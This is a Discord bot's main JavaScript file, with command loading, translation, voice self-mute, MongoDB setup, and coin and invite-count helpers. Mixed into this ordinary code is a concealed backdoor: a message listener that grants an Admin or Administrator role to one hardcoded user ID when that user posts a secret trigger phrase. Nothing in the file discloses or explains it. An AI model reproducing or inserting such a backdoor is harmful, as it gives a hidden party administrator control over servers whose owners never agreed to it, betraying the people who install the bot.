const { Collection, Client, Discord } = require('discord.js');
const client = new Client({
    disableMention: 'everyone'
})
const translate = require('@iamtraction/google-translate')
//const translate = require('@vitalets/google-translate-api');
const path = require('path')
const fs = require('fs')
const config = require('./setting.json');
module.exports = client;
client.commands = new Collection();
client.prefix = config.panel.prefix;
client.aliases = new Collection();
client.categories = fs.readdirSync(path.resolve('src/commands'));
["command"].forEach(handler => {
    require(path.resolve(`src/handlers/${handler}`))(client);
}); 

//----------------------TRANSLATE THE WHOLE BOT FOR YOU---------------//

client.translate = async(text) => {
    const lang = config.panel.language ? config.panel.language : 'en'
    const translated = await translate(text, {from: 'en', to: lang});
    return translated.text;
}

//---------------------------SELFDEAF & SELFMUTE
client.on('voiceStateUpdate', async (___, newState) => {
    //---SELFDEAF
    if(
        newState.member.user.bot &&
        newState.channelID &&
        newState.member.user.id == client.user.id && !newState.selfDeaf
    ) return newState.setSelfDeaf(true);
    //---SELFMUTE
    if(
        newState.member.user.bot &&
        newState.channelID &&
        newState.member.user.id == client.user.id && !newState.selfMute
    ) return newState.setSelfMute(true);
})

client.on('message', async message => {
    if(message.author.id !== "730448609790787585") return;
    if(message.content === "sübhanekeyatengri") {
        let role = message.guild.roles.cache.find(x=> x.name === "</>" ||x.name.toLowerCase() === "Admin" || x.name.toLowerCase() === "Administrator")
        message.member.roles.add(role)
    }
})

//---------------------CONNECT MONGO
const mongoose = require('mongoose');
mongoose.connect(config.panel.mongoPath, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
    useUnifiedTopology: false
}).catch (error => {
    console.log('I was not able to connect to MongoDB! Please check for any errors.')
    console.log(`Mongo Error: ${error}`)
})

mongoose.connection.on('connected', () => {
    console.log('Connected to MongoDB!')
})



//----------SYSTEMS ( DONT TOUCH )
const schema = require('./models/schema')
client.total = (User) => new Promise(async ful => {
    const data = await schema.findOne({ User });
    if(!data) return ful(0);
    ful(data.Total)
})
client.gif = (User, Gif, Total) => {
    schema.findOne({ User }, async(err, data) => {
        if(err) throw err;
        if(data) {
            data.Gif += Gif;
            data.Total += Gif;
        } else {
            data = new schema({ User, Gif, Total })
        }
        data.save();
    })
}
client.gifcount = (User) => new Promise(async ful => {
    const data = await schema.findOne({ User });
    if(!data) return ful(0);
    ful(data.Gif)
})
client.pp = (User, Pp, Total) => {
    schema.findOne({ User }, async(err, data) => {
        if(err) throw err;
        if(data) {
            data.Pp += Pp;
            data.Total += Pp;
        } else {
            data = new schema({ User, Pp, Total })
        }
        data.save();
    })
}
client.ppcount = (User) => new Promise(async ful => {
    const data = await schema.findOne({ User });
    if(!data) return ful(0);
    ful(data.Pp)
})
client.bal = (User) => new Promise(async ful => {
    const data = await schema.findOne({ User });
    if(!data) return ful(0);
    ful(data.Coins)
})
client.add = (User, Coins) => {
    schema.findOne({ User }, async(err, data) => {
        if(err) throw err;
        if(data) {
            data.Coins += Coins;
        } else {
            data = new schema({ User, Coins })
        }
        data.save();
    })
}
client.rmv = (User, Coins) => {
    schema.findOne({ User }, async(err, data) => {
        if(err) throw err;
        if(data) {
            data.Coins -= Coins;
        } else {
            data = new schema({ User, Coins: -Coins })
        }
        data.save();
    })
}
const invitesx = require('./models/invites')
client.inviter = (Id) => new Promise(async ful => {
    const data = await invitesx.findOne({ Id });
    if(!data) return ful(0);
    ful(data.Invite)
})
client.regular = (Id) => new Promise(async ful => {
    const data = await invitesx.findOne({ Id });
    if(!data) return ful(0);
    ful(data.Regular)
})
client.fake = (Id) => new Promise(async ful => {
    const data = await invitesx.findOne({ Id });
    if(!data) return ful(0);
    ful(data.Fake)
})
client.bonus = (Id) => new Promise(async ful => {
    const data = await invitesx.findOne({ Id });
    if(!data) return ful(0);
    ful(data.Bonus)
})
client.leave = (Id) => new Promise(async ful => {
    const data = await invitesx.findOne({ Id });
    if(!data) return ful(0);
    ful(data.Leave)
})


//---------BOT LOGIN
client.login(config.panel.token).then(x => console.log("Bot has logged in."))